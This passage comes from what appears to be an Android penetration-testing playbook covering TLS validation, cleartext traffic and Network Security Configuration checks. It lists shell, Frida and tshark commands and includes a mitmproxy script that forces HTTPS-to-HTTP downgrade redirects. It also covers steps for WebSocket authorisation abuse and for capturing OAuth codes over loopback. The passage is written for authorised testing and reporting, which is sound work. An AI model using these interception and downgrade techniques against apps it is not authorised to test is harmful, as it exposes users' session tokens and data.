  `HttpsURLConnection.setDefaultSSLSocketFactory(...)` are **process-global**. One SDK calling either
  with a permissive implementation compromises every connection in the process — including the app's own
  pinned ones — and the app's own code will look clean.
- **How:**
```bash
grep -rn 'setDefaultHostnameVerifier\|setDefaultSSLSocketFactory\|SSLContext.setDefault' jadx_out/sources/ \
  | grep -viE '^jadx_out/sources/(android|androidx)/'
# attribute the hit to a package, then to a Maven coordinate:
unzip -l base.apk | grep -iE 'META-INF/.*\.version'
unzip -p base.apk 'META-INF/*.version' 2>/dev/null
```
  Runtime attribution — log the caller, not just the call:
```javascript
Java.perform(function () {
  var H = Java.use('javax.net.ssl.HttpsURLConnection');
  H.setDefaultHostnameVerifier.implementation = function (v) {
    console.log('[GLOBAL VERIFIER] ' + v.$className + '\n' +
      Java.use('android.util.Log').getStackTraceString(Java.use('java.lang.Exception').$new()));
    return this.setDefaultHostnameVerifier(v); };
});
```
- **Proof:** The decompiled method body showing the permissive implementation, the stack trace naming
  the SDK package, **and** a Burp intercept of the **app's own** API traffic (not merely the SDK's)
  succeeding with a CA installed nowhere.
- **Escalation:** → D18 (third-party SDK inventory), → D13 (credential capture). Report it against the
  app; the app ships the SDK.
- **Ruled out when:** No global setter is called outside `android.*`/`androidx.*`, or the installed
  global delegates to the platform default and a self-signed cert is still rejected on every channel.

### D14-014 · OkHttp below 4.9.2 — hostname-verification bypass (CVE-2021-0341)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES); the version string alone is `using_components_with_known_vulnerabilities\|outdated_software_version` (P5) |
| **Attacker** | AM-06 |
| **Applies to** | apps bundling OkHttp < 4.9.2 **and** making manual `HostnameVerifier` calls; check okio separately |
| **Maps to** | CVE-2021-0341 (OkHttp prior to 4.9.2; the fix strictly verifies hostnames because "programs making manual calls could be defeated if hostnames weren't strictly ASCII"), CVE-2023-3635 (`com.squareup.okio:okio`, shipped inside OkHttp 4.11.0), CWE-297 |

- **Test:** Version alone is informational. The reachability condition is whether the app or an SDK makes
  **manual** verifier calls; code relying purely on OkHttp's internal default path is less affected.
  Pin the exact version and the exact call site before you write anything.
- **How:**
```bash
unzip -p base.apk 'META-INF/okhttp*.version' 2>/dev/null
grep -rn 'okhttp3/internal/Version\|OkHttp/' jadx_out/sources/ | head
grep -rn 'hostnameVerifier(\|OkHostnameVerifier\|HostnameVerifier' jadx_out/sources/ | grep -viE '^jadx_out/sources/(android|androidx)/'
grep -rn 'com.squareup.okhttp3\|com.squareup.okio' --include='*.gradle*' --include='*.toml' .   # if source is available
```
  Then serve a certificate whose CN/SAN is a non-ASCII / IDN-confusable form of the real host and drive
  the manual-verifier path.
- **Proof:** All three together: the version string `< 4.9.2`, a jadx hit on an app/SDK-level
  `hostnameVerifier(...)` call, and a Burp session where the confusable-hostname certificate is accepted
  (a 200 with app data, **not** `SSLPeerUnverifiedException` in logcat).
- **Escalation:** MitM of authenticated API traffic → D15. Check the okio coordinate independently —
  OkHttp 4.11.0 shipped a vulnerable okio, so "we upgraded OkHttp" does not close CVE-2023-3635.
- **Ruled out when:** The bundled OkHttp is ≥ 4.9.2, **or** there is no manual verifier call anywhere
  outside `android.*`/`androidx.*` and the confusable-hostname certificate is rejected.

### D14-015 · Separate trust-all from a legitimate TLS-1.2 enablement shim (false-positive gate)

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (kill gate for D14-007..D14-010) |
| **Attacker** | n/a |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0282, MASWE-0027 |

- **Test:** Three things look alike in decompiled code and only one is a bug: (a) an empty
  `checkServerTrusted` that trusts everything — a genuine vulnerability; (b) a shim that delegates to
  the platform default, typically installed to enable TLS 1.2 on API ≤ 21 — **not** a vulnerability;
  (c) real pinning. Worked calibration from the corpus: one large e-commerce app's main API had no
  pinning at all, only a TLS-1.2 shim using the system default for API ≤ 21 — reporting that as
  trust-all would have been a retraction.
- **How:**
```bash
grep -rn -A15 'checkServerTrusted' jadx_out/sources/ | less
# a DELEGATING shim looks like: TrustManagerFactory.getInstance(getDefaultAlgorithm()); init((KeyStore)null);
grep -rn -B6 -A6 'TrustManagerFactory.getInstance' jadx_out/sources/
grep -rn 'setEnabledProtocols\|TLSv1.2\|Tls12SocketFactory\|ProviderInstaller' jadx_out/sources/
```
  The decisive dynamic test is the certificate you present: use a **self-signed certificate for the
  wrong hostname, with your CA not installed**. A correctly-configured app rejects it; a trust-all app
  accepts it. Your CA-signed proxy certificate would be accepted by *both* once the CA is installed, so
  it proves nothing.
- **Proof:** Either the app completes the request against the self-signed wrong-CN certificate (→ file
  D14-007/D14-009), or it does not (→ the shim is benign; record it as ruled out).
- **Escalation:** n/a — this is a kill gate. It is the TLS analogue of the layer-ordering trap.
- **Ruled out when:** The shim's terminal delegate is a `TrustManagerFactory` initialised with `null`
  and the self-signed wrong-CN test fails — record "custom TrustManager present, delegates to system
  anchors, validated by negative MitM on <date>" in the ruled-out register.

### D14-016 · Cleartext permitted by configuration — read against the right default

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES) — only once paired with observed sensitive traffic (D14-018) |
| **Attacker** | AM-06 |
| **Applies to** | all. **LEGACY:** cleartext is permitted by default at `targetSdk < 28`; denied by default at 28+ |
| **Maps to** | MASTG-TEST-0235, MASWE-0026, MASTG-KNOW-0014, MASTG-TECH-0150, MASTG-TECH-0151, CWE-319, MobSF `clear_text_traffic` |

- **Test:** Determine whether HTTP is *allowed*, and by which mechanism, with the API-level default
  stated. On a modern target this is a deliberate opt-out and that fact is the strongest sentence in the
  finding; on a low-targetSdk app it is the platform default and is worth far less on its own.
- **How:**
```bash
grep -iE 'usesCleartextTraffic|networkSecurityConfig' apktool_out/AndroidManifest.xml
aapt2 dump badging base.apk | grep targetSdkVersion
yq -p=xml -o=json -r '."network-security-config"."base-config"."+@cleartextTrafficPermitted" // ""' \
   apktool_out/res/xml/network_security_config.xml
yq -p=xml -o=json '.' apktool_out/res/xml/network_security_config.xml | \
  jq -r '.["network-security-config"]["domain-config"][]? | {domain, cleartext: .["+@cleartextTrafficPermitted"]}'
```
- **Proof:** MASTG's exact failing conditions, quoted in the report: (1) manifest sets
  `usesCleartextTraffic="true"` **and there is no NSC**; (2) the NSC sets `cleartextTrafficPermitted="true"`
  in `<base-config>`; (3) the NSC sets it `true` in any `<domain-config>`. The non-failing edge case you
  must know before you file: manifest `true` **plus** an NSC — even an empty
  `<network-security-config></network-security-config>` — does **not** fail, because the NSC overrides
  the manifest flag entirely.
- **Escalation:** Pair with D14-018 (traffic observed) and report the credential, not the flag. A
  cleartext domain that serves code/config is D17 and a different severity entirely.
- **Ruled out when:** `targetSdk ≥ 28`, no `usesCleartextTraffic="true"`, and no
  `cleartextTrafficPermitted="true"` in `base-config` or any `domain-config` — plus a pcap containing no
  TCP/80 conversation from the app's UID across a full feature walk.

### D14-017 · Per-domain `cleartextTrafficPermitted="true"` carve-outs on first-party hosts

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES) |
| **Attacker** | AM-06 |
| **Applies to** | `targetSdk ≥ 28` apps with an NSC (API 24+) |
| **Maps to** | MASTG-TEST-0235, MASWE-0026, MASTG-TECH-0151, MobSF `network_security.py` finding "Domain config is insecurely configured to permit clear text traffic" |

- **Test:** The global default being secure hides the per-domain exception. Enumerate every
  `<domain-config>` and classify its domains: first-party API / auth / analytics / CDN. The common
  shortcut is an "analytics" carve-out that then carries the advertising id and the user id.
- **How:**
```bash
python3 - <<'PY'
import glob, xml.dom.minidom as m
for f in glob.glob('apktool_out/res/xml/*.xml'):
    try: d = m.parse(f)
    except Exception: continue
    if not d.getElementsByTagName('network-security-config'): continue
    for sec in ('base-config','domain-config','debug-overrides'):
        for c in d.getElementsByTagName(sec):
            doms=[x.firstChild.nodeValue for x in c.getElementsByTagName('domain')]
            print(sec, doms or ['*'], 'cleartext=', c.getAttribute('cleartextTrafficPermitted') or '-')
            for cert in c.getElementsByTagName('certificates'):
                print('   trust-anchor src=', cert.getAttribute('src'),
                      'overridePins=', cert.getAttribute('overridePins') or '-')
            for ps in c.getElementsByTagName('pin-set'):
                print('   pin-set expiration=', ps.getAttribute('expiration') or 'NONE',
                      [p.firstChild.nodeValue for p in ps.getElementsByTagName('pin')])
PY
```
  Then exercise the feature that talks to each carved-out domain and capture.
- **Proof:** The exact XML stanza, the domain, and a captured HTTP request to it containing an
  identifier, token or PII. Quote the stanza verbatim — on a `targetSdk ≥ 28` app it is documented
  intent, not an oversight.
- **Escalation:** → D20 (identifiers to a third party in clear), → D13 if the carve-out domain
  participates in auth, → D17 if it serves config or assets the app trusts.
- **Ruled out when:** Every `<domain-config cleartextTrafficPermitted="true">` domain is demonstrably a
  non-first-party static asset host and the captured traffic to it carries no identifier, cookie or
  token — record the domain list and the captured request set as the negative.

### D14-018 · Cleartext observed on the wire and attributed to the app's UID

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES → High); `broken_authentication_and_session_management\|cleartext_transmission_of_session_token` (P4); `\|weak_login_function\|over_http` (P4); `\|weak_registration_implementation\|over_http` (P4) |
| **Attacker** | AM-06 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0236, MASWE-0026, MASTG-TECH-0010, MASTG-TECH-0011, MASTG-TECH-0028, MASTG-TOOL-0075, MASTG-TOOL-0081, MASTG-TOOL-0078 (MITM Relay, for non-HTTP protocols such as XMPP), CWE-319, ATT&CK T1639.001, mitigation M1009; H1 #12977, #166712 (Boozt, login without SSL), #2101 (Yahoo, signup over HTTP) |

- **Test:** Static config shows what is *possible*. Capture what actually happens, and attribute the
  socket to the app — MASTG's stated limitation is that network capture shows *device* traffic, and a
  triager will use that to close the report.
- **How:**
```bash
adb shell su -c '/data/local/tmp/tcpdump -i any -s0 -w /sdcard/cap.pcap'
adb pull /sdcard/cap.pcap
tshark -r cap.pcap -Y 'http.request' -T fields -e ip.dst -e http.host -e http.request.uri -e http.authorization
# attribute the socket to the app's PID/UID:
PID=$(adb shell pidof <pkg>)
adb shell netstat -p | grep "$PID"
adb shell cat /proc/$PID/net/tcp        # rem_address in hex, uid field
```
- **Proof:** A captured HTTP request from the app's PID/UID containing an `Authorization` header, a
  session cookie, a credential, or PII — the plaintext bytes are the evidence, not the manifest
  attribute. Include the `/proc/<pid>/net/tcp` or `netstat -p` line in the same evidence pack.
- **Escalation:** Captured token → D13 replay → account takeover. Cleartext at the *login* or *signup*
  step is a named VRT node of its own (`weak_login_function|over_http`, P4) and should be filed as such
  rather than buried in a generic transport report.
- **Ruled out when:** A full feature walk (cold start, login, session refresh, background sync, media,
  downloads, push registration, logout) produces no TCP/80 conversation from the app's UID and no
  `http://` request in the transparent-mode proxy.

### D14-019 · Hardcoded `http://` URLs proven to be reachable — and the unregistered-domain check

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES) → `server_side_injection\|remote_code_execution_rce` (P1) for the code-delivery case |
| **Attacker** | AM-06; **AM-01** when the hardcoded host is unregistered |
| **Applies to** | all; native `.so` strings included |
| **Maps to** | MASTG-TEST-0233, MASTG-TEST-0238 (the Frida-plus-`.backtrace()` approach), MASWE-0026, MASTG-TECH-0019, CWE-319; EDB 42288 / 42287 / 42349 / 42350 (MitM → `addJavascriptInterface` RCE chains); Android Lint check `InsecureBaseConfiguration` |

- **Test:** MASTG is explicit that presence is not enough: "The presence of HTTP URLs alone does not
  necessarily mean they are actively used." Find them, xref them to a connection-creating call, prove
  the request on the wire — **and check whether each hardcoded host is still registered**. EDB 42288 is
  the reason: the app hardcoded `http://www.comparison.net.au` and the domain was unregistered, so no
  MitM position was needed at all and the attacker model collapses from AM-06 to AM-01.
- **How:**
```bash
grep -rIoE 'http://[A-Za-z0-9._~:/?#@!$&()*+,;=%-]+' apktool_out/ jadx_out/sources/ \
  | grep -viE 'schemas\.android|w3\.org|apache\.org|xmlpull|localhost|127\.0\.0\.1|example\.(com|org)' | sort -u
rabin2 -zz lib/*/*.so | grep 'http://'
# registration / takeover check for every distinct host:
for h in $(cat hosts.txt); do whois "$h" 2>/dev/null | grep -qiE 'no match|not found|NOT FOUND' \
  && echo "UNREGISTERED: $h"; done
dig +short <host>
```
  Runtime confirmation with attribution to a code location:
```javascript
Java.perform(function () {
  var U = Java.use('java.net.URL');
  U.openConnection.overload().implementation = function () {
    var s = this.toString();
    if (s.indexOf('http://') === 0)
      console.log('[CLEARTEXT] ' + s + '\n' + Java.use('android.util.Log')
        .getStackTraceString(Java.use('java.lang.Exception').$new()));
    return this.openConnection(); };
});
```
- **Proof:** The constant, the backtrace showing the call site, and the request captured on the wire —
  or, for the unregistered case, the WHOIS output plus the app connecting to a host you then register or
  point at yourself.
- **Escalation:** A cleartext page loaded into a bridged WebView is the classic MitM→bridge RCE chain
  (→ D10); a cleartext config/update fetch is → D17.
- **Ruled out when:** Every `http://` constant is a namespace URI, a comment, an unreferenced resource
  string, or is xref'd only to code behind a dead feature flag — and no `http://` request appears under
  the Frida `openConnection` hook across a full feature walk.

### D14-020 · `ws://` WebSocket transport, and per-message authorisation on `wss://`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES) for `ws://`; `broken_access_control\|idor\|view_sensitive_information_iterable_object_identifiers` (P3) upward for the per-message authz case |
| **Attacker** | AM-06 for `ws://`; AM-05 for the authz case |
| **Applies to** | apps with real-time features — chat, live orders, trading, presence, notifications |
| **Maps to** | MASWE-0026, CWE-319; corpus community sources on WebSocket transport and Pusher/PubNub/Ably SDK channels |

- **Test:** Two separate bugs. (a) The socket URL is `ws://`, so the whole channel is in clear including
  the token used to open it. (b) The socket is `wss://` but the server authorises only at connection
  time and then trusts every frame — send a frame referencing another user's object id.
- **How:**
```bash
grep -rn "ws://\|wss://\|WebSocketListener\|newWebSocket\|okhttp3.WebSocket\|Socket\.io\|Pusher\|PubNub\|Ably" jadx_out/sources/
tshark -r cap.pcap -Y 'websocket' -T fields -e ip.dst -e tcp.dstport -e websocket.payload
# Burp: WebSockets history -> select a frame -> edit the object id -> re-send
```
- **Proof:** For (a) a captured `ws://` upgrade request carrying the session token. For (b) a WebSocket
  frame for another user's resource id returning that user's data — compare response **bodies**, not
  frame counts.
- **Escalation:** → D15 (BOLA over a channel most testers skip entirely), → D13 if the upgrade request
  carries the session token in the URL.
- **Ruled out when:** All socket URLs are `wss://`, the upgrade carries the token in a header rather
  than the query string, and a frame naming a foreign object id returns an authorisation error rather
  than data.

### D14-021 · HTTPS→HTTP downgrade: does the client follow a redirect to `http://`?

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES) |
| **Attacker** | AM-06 (needs only to answer the first, pre-TLS request or to be the redirect source) |
| **Applies to** | all; OkHttp's `followSslRedirects` defaults to **true** |
| **Maps to** | MASWE-0026, CWE-319, ATT&CK T1638 |

- **Test:** Even a fully HTTPS app can be downgraded if the client follows a cross-scheme redirect, or
  if the very first request of a session is the plain-HTTP one that gets redirected. `OkHttpClient` sets
  `followSslRedirects(true)` by default, and the NSC will not stop the resulting request if any domain
  carve-out permits cleartext.
- **How:**
```bash
grep -rn 'followSslRedirects\|followRedirects\|setInstanceFollowRedirects\|HttpURLConnection.setFollowRedirects' jadx_out/sources/
# in the proxy, answer a first-party request with a downgrade:
#   HTTP/1.1 302 Found
#   Location: http://api.target.tld/v1/session
```
  With mitmproxy:
```python
# downgrade.py -- mitmdump -s downgrade.py
def response(flow):
    if flow.request.pretty_host.endswith("target.tld") and flow.response.status_code == 200:
        flow.response.status_code = 302
        flow.response.headers["Location"] = "http://" + flow.request.pretty_host + flow.request.path
```
- **Proof:** The follow-up request appearing over plain HTTP in the capture, carrying the same
  `Authorization`/`Cookie` header — that is the token in clear, obtained without breaking TLS at all.
- **Escalation:** → D13. This is often the only cleartext a modern app will produce, and it is the
  version of the finding an AM-06 attacker can actually cause.
- **Ruled out when:** `followSslRedirects(false)` is set on every client, or the downgrade response
  produces an error/abort in logcat and no HTTP request follows.

### D14-022 · The NSC does not govern non-platform HTTP stacks — "cleartext is impossible" is false

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES) |
| **Attacker** | AM-06 |
| **Applies to** | Flutter (Dart `HttpClient` on its own BoringSSL and its own CA list), Unity (`UnityWebRequest`), Cronet, gRPC, Go and any bundled native stack; Capacitor's `server.cleartext` |
| **Maps to** | MASTG-TECH-0151, MASWE-0026, CWE-319; corpus: Dart's compiled-in CA list (`session_verify_cert_chain` in `x509.cc`), Capacitor `WebViewLocalServer` |

- **Test:** A Network Security Configuration that forbids cleartext constrains the platform
  `HttpsURLConnection`/OkHttp path. It does not constrain Dart's `HttpClient`, Unity's web request, or a
  native stack. Never conclude "cleartext is impossible" from the NSC alone — prove it empirically.
- **How:**
```bash
unzip -l base.apk | grep -iE 'libflutter\.so|libapp\.so|libmonodroid|libunity|libcronet|libgojni|libcurl'
grep -n 'networkSecurityConfig\|usesCleartextTraffic' apktool_out/AndroidManifest.xml
cat apktool_out/res/xml/network_security_config.xml
python3 -c "import json;print(json.load(open('apktool_out/assets/capacitor.config.json')).get('plugins',{}))" 2>/dev/null
grep -rn 'isDomainExcludedFromSSL\|acceptAllCerts\|sslPinning\|"cleartext"' apktool_out/assets/ jadx_out/sources/ 2>/dev/null | head
# empirical:
tcpdump -i any -n 'tcp port 80'    # on the lab AP/gateway while driving the app
```
- **Proof:** A plaintext HTTP request from the app captured on the wire **despite** an NSC that declares
  `cleartextTrafficPermitted="false"` — put the XML and the packet side by side.
- **Escalation:** The same reasoning applies to the pin set (→ D14-036) and to the trust store: a stack
  that ignores the NSC usually ignores the system trust store too.
- **Ruled out when:** The APK ships no non-platform HTTP stack (no Flutter/Unity/Cronet/Go/libcurl
  binaries), or a gateway-level TCP/80 capture across a full feature walk is empty.

### D14-023 · Loopback and LAN listeners: the sockets the NSC and Local Network Protection do not cover

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management\|authentication_bypass` (P1) when an authorization code is captured; `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES) for an unauthenticated LAN service |
| **Attacker** | **AM-03** zero-permission local app (loopback); AM-06 / same-LAN peer (LAN listener) |
| **Applies to** | all for loopback; the LAN gate is Android 16 / targetSdk 36+ |
| **Maps to** | MASWE-0029; Android 16 Local Network Protection (`adb shell am compat enable RESTRICT_LOCAL_NETWORK <pkg>`, address ranges 169.254.0.0/16, 100.64.0.0/10, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, IPv4 broadcast, IPv6 link-local; DNS port 53 excepted; error strings `sendto failed: EPERM` / `sendto failed: ECONNABORTED`) |

- **Test:** Android does **not** isolate loopback sockets between apps. An app implementing the
  desktop-style "local HTTP server on 127.0.0.1 for the OAuth callback" pattern can have its
  authorization code captured by any unprivileged app that binds or connects first. Separately, an app
  that exposes a `ServerSocket` on the LAN is reachable by every device on the network. **Android 16's
  Local Network Protection restricts LAN access, not loopback — do not assume LNP mitigates the OAuth
  case.**
- **How:**
```bash
grep -rnE 'ServerSocket|NanoHTTPD|127\.0\.0\.1|localhost|redirect_uri|loopback|MulticastSocket|DatagramSocket|NsdManager|\.local' jadx_out/sources/
adb shell ss -lntp 2>/dev/null || adb shell netstat -lntp
adb shell cat /proc/net/tcp | awk '{print $2, $4, $8}' | head -40     # local_address, state, uid
# LAN behaviour under the Android 16 gate:
adb shell am compat enable RESTRICT_LOCAL_NETWORK <pkg>; adb reboot
adb logcat -d | grep -E 'sendto failed: EPERM|sendto failed: ECONNABORTED'
adb shell am compat disable RESTRICT_LOCAL_NETWORK <pkg>
```
- **Proof:** For loopback: a listening port owned by the target's UID during the OAuth flow, plus a
  successful fetch of the callback URL (carrying `code=`) from a second, unprivileged process. For LAN:
  an unauthenticated request from another device that returns app data — and, under the compat gate, a
  behavioural diff showing the app falling back to a **less authenticated or cleartext** path when LAN
  access is denied.
- **Escalation:** Authorization code → token exchange (worse when PKCE is absent or the verifier is
  predictable) → D13 account takeover. Degradation-under-denial is its own finding.
- **Ruled out when:** No `ServerSocket`/`NanoHTTPD` bind occurs during any flow (`/proc/net/tcp` shows
  no LISTEN row for the app's UID at any point), and the OAuth redirect uses a custom scheme or an App
  Link rather than a loopback URI.

### D14-024 · Non-HTTP and non-standard-port channels that escape the harness

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | rated on the channel's contents; `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES) as the transport node |
| **Attacker** | AM-06 |
| **Applies to** | all; especially messaging, IoT-companion, gaming and finance apps |
| **Maps to** | ATT&CK T1509 Non-Standard Port (precedents named by ATT&CK: Cerberus "HTTP requests over port 8888", Chameleon "port 7242", FlexiSpy "ports 12512 and 12514"), T1437.001, T1521, MASTG-TOOL-0078 (MITM Relay for XMPP-class protocols) |

- **Test:** MQTT, XMPP, raw TCP, gRPC over h2c, WebSocket on an odd port and QUIC/UDP routinely carry
  the most sensitive payloads and get the least testing, because an HTTP proxy never shows them.
- **How:**
```bash
tshark -r cap.pcap -q -z conv,tcp | sort -k2 | head -40
tshark -r cap.pcap -Y 'quic || mqtt || websocket || xmpp' \
  -T fields -e ip.dst -e tcp.dstport -e udp.dstport | sort -u
grep -rn -i 'mqtt\|xmpp\|Socket(\|SSLSocketFactory\|grpc\|QuicChannel\|cronet\|newWebSocket' jadx_out/sources/
# relay a non-HTTP TLS protocol through your proxy:
#   MITM Relay (MASTG-TOOL-0078) in front of the app's target host:port
```
- **Proof:** A conversation in the pcap to a port the proxy never saw, named with host, port and
  protocol, and the payload shown. Then rate what is inside it.
- **Escalation:** Whatever the channel carries. Force the app onto your visible harness by blocking
  UDP/443 at the AP and, if the app has an alternate port, blocking that too — and **state in the report
  that you did this**, because the fallback behaviour is itself a finding.
- **Ruled out when:** Every TCP/UDP conversation in the pcap is accounted for by an intercepted flow, and
  the app's only non-443 destinations are DNS and NTP.

### D14-025 · Sensitive values in the request line rather than the body

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure\|token_leakage_via_referer\|over_http` (P4) where applicable; otherwise argue under `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES). Note Xiaomi explicitly excludes "sensitive data in URLs/request bodies **when protected by TLS**" |
| **Attacker** | AM-09 (log-holder), AM-06 over cleartext |
| **Applies to** | all |
| **Maps to** | CWE-319; corpus community sources sec-14-4 #9, sec-14-18 #23 |

- **Test:** Tokens, OTPs, PANs and PII in the query string land in server logs, proxy logs, CDN logs and
  `Referer` headers on any outbound link. TLS does not help against any of those holders.
- **How:**
```bash
grep -rn 'HttpUrl.Builder\|addQueryParameter\|Uri.Builder\|appendQueryParameter\|buildUpon' jadx_out/sources/ \
  | grep -iE 'token|otp|pass|card|ssn|email|session|auth|key'
# Burp: filter HTTP history by query string, then sort by parameter name
```
- **Proof:** A request line containing `?access_token=…`, `?otp=…` or an account identifier — and, for
  the strong version, the same value reappearing in a `Referer` header on a request to a third-party
  host.
- **Escalation:** → D20 where the third-party recipient is an analytics processor the user never
  consented to; → D13 if the leaked value is a bearer credential.
- **Ruled out when:** No credential-class parameter appears in any request line across a full feature
  walk, and no outbound third-party request carries a first-party `Referer` containing one.

### D14-026 · `<certificates src="user"/>` shipped in a production trust anchor

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES) — Medium standalone, High once you capture credentials through the user-CA intercept |
| **Attacker** | AM-06 for the consequence; the enabling step is a user-installed CA (phishing, a malicious profile, an MDM, or malware with a settings-injection primitive) |
| **Applies to** | `targetSdk ≥ 24`, where this is an explicit opt-in. **LEGACY:** at `targetSdk < 24` user CAs are trusted with no config at all and this is the platform default, not a misconfiguration |
| **Maps to** | MASTG-TEST-0286, MASWE-0027, MASTG-KNOW-0014, semgrep rule `mastg-android-network-insecure-trust-anchors` (literally `match: any: - <certificates src="user"`), MASTG-TOOL-0110, MobSF `network_security.py` "Base config is configured to trust user installed certificates" (HIGH), ATT&CK T1632 Subvert Trust Controls |

- **Test:** An app that re-enables user-CA trust voluntarily reverses a platform hardening and makes
  interception possible with **no root and no instrumentation**, which widens the realistic attacker
  population enormously.
- **How:**
```bash
grep -n -A6 '<trust-anchors>' apktool_out/res/xml/network_security_config.xml
yq -p=xml -o=json -r '.network-security-config."base-config"."trust-anchors".certificates[]."+@src"' \
   apktool_out/res/xml/network_security_config.xml
semgrep -c rules/mastg-android-network-insecure-trust-anchors.yml apktool_out/res/xml/network_security_config.xml
grep -n 'debug-overrides' apktool_out/res/xml/network_security_config.xml   # distinguish scope
```
  Expected semgrep output shape:
```
    network_security_config.xml
    ❯❱ rules.mastg-android-network-insecure-trust-anchors
            6┆ <certificates src="user" />
```
- **Proof:** The `<certificates src="user"/>` element inside `<trust-anchors>` **outside** any
  `<debug-overrides>` block, in the release APK pulled from Play, plus full request/response interception
  using only a **user-store** CA on a stock, non-rooted device — no Frida, no patched APK, no root.
  That combination is the reportable condition.
- **Escalation:** Full traffic control → token theft (D13), response tampering (D15), injected content
  into a WebView (D10). Pair with a phishing flow that induces the CA install to make the attacker path
  concrete.
- **Ruled out when:** `targetSdk ≥ 24` and no `src="user"` appears outside `<debug-overrides>`, and a
  user-store CA install produces TLS failures for every first-party host on a stock device.

### D14-027 · `minSdkVersion < 24` — implicit user-CA trust on old devices (LEGACY)

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES), scoped to the affected device population |
| **Attacker** | AM-06 after a user-CA install |
| **Applies to** | **LEGACY** — only when `minSdkVersion < 24`; state the affected device share in the report |
| **Maps to** | MASTG-TEST-0285 (note its frontmatter carries `deprecated_since: 24`), MASWE-0027, MASTG-KNOW-0014, MASTG-TECH-0150, ATT&CK T1632 ("apps that target compatibility with Android 7 and higher (API Level 24) default to only trusting CA certificates that are bundled with the operating system") |

- **Test:** Apps installable on API ≤ 23 inherit the pre-NSC default that trusts both the system **and**
  the user store, with no configuration required.
- **How:**
```bash
aapt2 d badging base.apk | grep "^sdkVersion"
```
- **Proof:** `sdkVersion:'23'` or lower. MASTG's evaluation is exactly: "The test case fails if
  `minSdkVersion` is less than 24." Support it with an interception on an API 23 emulator using a
  user-store CA only.
- **Escalation:** Same consequence as D14-026, restricted to the pre-Nougat population. Pair it with
  D14-044 (no `ProviderInstaller`) into one "the app supports and does not harden legacy TLS stacks"
  finding rather than two weak ones.
- **Ruled out when:** `minSdkVersion ≥ 24`. That single line closes it; record it.

### D14-028 · `<debug-overrides>` shipped **and** the app is debuggable

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES → High/Critical with the captured session); the debuggable half also files under D02/D26 |
| **Attacker** | AM-06 plus anyone with adb/USB access; and AM-03 via `run-as`/JDWP |
| **Applies to** | all. `<debug-overrides>` applies **only** when `android:debuggable="true"`; `overridePins` defaults to `true` inside that block |
| **Maps to** | MASWE-0063, MASTG-TECH-0011, Google risk `android-debuggable`, MobSF `app_is_debuggable` (high) and the `network_security.analysis(..., debuggable, ...)` gate — MobSF raises the debug-override findings **only** when `is_debuggable` is true |

- **Test:** A release APK containing debug overrides is normally inert and **informational only**. It
  becomes a shipped MitM backdoor when the same build is debuggable: pinning and the trust store are both
  switched off for anyone who can install a certificate or attach a debugger.
- **How:**
```bash
aapt2 dump badging base.apk | grep -i debuggable
grep -n 'android:debuggable' apktool_out/AndroidManifest.xml
sed -n '/<debug-overrides>/,/<\/debug-overrides>/p' apktool_out/res/xml/network_security_config.xml
grep -rn 'overridePins' apktool_out/res/xml/
adb shell dumpsys package <pkg> | grep -i DEBUGGABLE     # confirm on the INSTALLED store build
```
- **Proof:** `application-debuggable` in `aapt2 dump badging` **and** a
  `<debug-overrides><trust-anchors><certificates src="user"/>` block, **and** an end-to-end MitM using
  only a user-store CA with no root. Confirm the debuggable flag on the build installed from the store,
  not on your own rebuild.
- **Escalation:** Debuggable also gives JDWP → arbitrary code in the app's UID → token theft with no
  network position at all (→ D02, D26). File the two primitives separately and cross-reference; one fix
  equals one bounty.
- **Ruled out when:** `aapt2 dump badging` shows no `application-debuggable` on the store build — the
  `<debug-overrides>` block is then inert and belongs in the graveyard table, not the findings list.

### D14-029 · `overridePins="true"` outside `<debug-overrides>`, or a user anchor in `base-config`

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES) |
| **Attacker** | AM-06 after a user-CA install (no root required) |
| **Applies to** | NSC apps, API 24+. `overridePins` defaults to `false` everywhere **except** inside `<debug-overrides>`, where it defaults to `true` |
| **Maps to** | Android NSC reference (`<debug-overrides>`, `overridePins`, `<certificates src>`), MASWE-0028, MobSF "Base config is configured to bypass certificate pinning" (HIGH) |

- **Test:** `<certificates src="user" overridePins="true"/>` in `base-config` or a production
  `domain-config` means any user-installed CA defeats the app's own pin set. The app appears pinned in
  code review and is not pinned in practice.
- **How:**
```bash
grep -nE 'overridePins|src="user"|src="system"|src="@raw' apktool_out/res/xml/network_security_config.xml
python3 - <<'PY'
import glob, xml.dom.minidom as m
for f in glob.glob('apktool_out/res/xml/*.xml'):
